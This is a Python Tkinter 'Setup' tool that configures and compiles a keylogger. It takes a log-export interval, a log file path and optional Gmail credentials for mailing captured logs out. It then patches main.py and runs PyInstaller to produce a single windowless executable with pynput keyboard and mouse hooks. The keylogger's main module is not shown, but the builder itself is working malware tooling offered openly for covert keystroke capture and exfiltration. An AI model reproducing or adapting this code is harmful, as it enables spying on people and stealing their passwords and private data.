import os
import site
import sys
from tkinter import *
from tkinter import messagebox

# change the current working directory to the directory of the script
os.chdir(os.path.dirname(os.path.abspath(__file__)))

def save_file(constructor):
    """
    save file to the path, in user profile dir
    """
    # prepare the line to be added to main.py
    match_line = "if __name__ == \"__main__\":"
    new_line = f"{match_line}\n{4 * ' '}Main{constructor}.start()"

    # read the contents of main.py
    with open("main.py", "r") as file:
        file_contents = file.readlines()

    # find the line where the main block starts
    for i, line in enumerate(file_contents):
        if line.startswith(match_line):
            break

    # modify the file contents to include the new line
    file_contents = file_contents[:i]
    file_contents.append(new_line)

    # write the modified contents back to main.py
    with open("main.py", "w") as file:
        file.writelines(file_contents)

def get_pyinstaller():
    # get the user site-packages path
    user_path = site.getusersitepackages().split("\\")[:-1]
    user_path = "\\".join(user_path)

    # search for pyinstaller.exe in site-packages and user site-packages
    for path in site.getsitepackages() + [site.getusersitepackages(), user_path]:
        _path = os.path.join(path, "Scripts", "pyinstaller.exe")
        if os.path.isfile(_path):
            return f"\"{_path}\""

    # show error message if pyinstaller is not found
    messagebox.showerror("Error", "Pyinstaller not found in any site packages.")
    sys.exit(0)

class Setup:
    def __init__(self, ):
        # flag to check if gmail export is used
        self.use_gmail = False

    def create_ui(self, title, x, y):
        # create the main window
        self.root = Tk()
        self.root.geometry(f"{x}x{y}")
        self.root.resizable(0, 0)
        self.root.title(title)

        # create input for export logs interval
        self.txt_time = Entry(self.root, bd=3)
        Label(self.root, text="Export logs interval (s)").pack()
        self.txt_time.insert(END, "60")
        self.txt_time.pack()

        # create input for log export path
        self.txt_export = Entry(self.root, bd=3)
        Label(self.root, text="Path to log export").pack()
        self.txt_export.insert(END, r"%userprofile%\\log.txt")
        self.txt_export.pack()

        # create Gmail export section
        self.lb_frame = LabelFrame(self.root, text="Gmail export")
        self.lb_frame.pack()

        self.txt_username = Entry(self.lb_frame, bd=3)
        Label(self.lb_frame, text="Gmail username").pack()
        self.txt_username.insert(END, "email@gmail.com")
        self.txt_username.pack()

        self.txt_pass = Entry(self.lb_frame, bd=3)
        Label(self.lb_frame, text="Gmail password").pack()
        self.txt_pass.insert(END, "password")
        self.txt_pass.pack()

        # create optional config section
        self.lb_frame2 = LabelFrame(self.root, text="Optional config")
        self.lb_frame2.pack()

        # button to enable gmail export
        self.btn_use_gmail = Button(self.lb_frame2, text="Use Gmail export", width=16, bd=4, command=self.on_click_use_gmail)
        self.btn_use_gmail.pack()

        # button to build the project
        self.btn_build = Button(self.root, text="Build", width=28, bd=4, command=self.on_click_build)
        self.btn_build.pack(side=BOTTOM)

        # start the Tkinter main loop
        self.root.mainloop()

    def on_click_use_gmail(self):
        # disable the Gmail export button and set the flag
        self.btn_use_gmail.configure(state="disabled")
        self.use_gmail = True

    def on_click_build(self):
        """
        build the keylogger
        """
        # hide the main window
        self.root.withdraw()

        # prepare constructor arguments based on user input
        constructor_args = f"({self.txt_time.get()}, \"{self.txt_export.get()}\""

        if self.use_gmail:
            constructor_args += f", \"{self.txt_username.get()}\", \"{self.txt_pass.get()}\""

        constructor_args += ")"

        # save the modified main.py file
        save_file(constructor_args)

        # run pyinstaller to build the project
        os.system(f"{get_pyinstaller()} main.py --onefile --windowed -y --clean --hidden-import "
                  f"pynput.keyboard._win32 --hidden-import pynput.mouse._win32 --exclude-module FixTk "
                  f"--exclude-module tcl --exclude-module tk --exclude-module _tkinter --exclude-module tkinter "
                  f"--exclude-module Tkinter")

        # show a message box when the build is finished
        messagebox.showinfo("Build", "Finished!")

        # destroy the main window
        self.root.destroy()

if __name__ == "__main__":
    Setup().create_ui("Setup", 300, 350)
